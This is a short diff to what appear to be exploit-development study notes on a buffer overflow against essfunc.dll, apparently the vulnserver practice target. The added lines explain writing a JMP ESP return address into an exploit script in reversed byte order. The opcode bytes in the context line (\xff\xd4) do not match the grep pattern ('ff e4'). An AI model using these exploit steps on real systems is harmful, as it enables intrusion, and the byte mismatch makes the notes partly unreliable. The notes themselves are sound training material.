@@ -225,6 +225,12 @@ Alternate method: on attack box, search DLL file for JMP ESP (\xff\xd4)
  
     objdump -d essfunc.dll | grep 'ff e4'
     
+Insert address into script as retn variable, with bytes flipped. 
+Ex.
+
+    retn = "\xdf\x14\x50\x62"      #0x625014df        
+
+    
 Popping calc.exe    
 ================   
 
